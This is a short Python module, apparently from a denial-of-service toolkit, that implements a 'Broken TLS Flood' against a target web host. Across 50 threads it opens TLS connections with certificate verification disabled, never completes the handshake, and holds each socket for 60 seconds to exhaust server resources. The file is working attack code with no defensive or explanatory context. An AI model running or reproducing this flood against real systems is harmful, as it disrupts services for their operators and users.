# modules/broken_tls.py

import socket
import ssl
import threading
import time

def tls_half_open(target_host, port=443):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target_host, port))
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        tls_sock = context.wrap_socket(sock, server_hostname=target_host, do_handshake_on_connect=False)
        time.sleep(60)  # TLS tamamlanmadan bırak
        tls_sock.close()
    except:
        pass

def run(target, threads=50, _=0):
    print("[*] Başlatılıyor: Broken TLS Flood")
    host = target.replace("https://", "").split("/")[0]
    thread_list = []

    for _ in range(threads):
        t = threading.Thread(target=tls_half_open, args=(host,))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
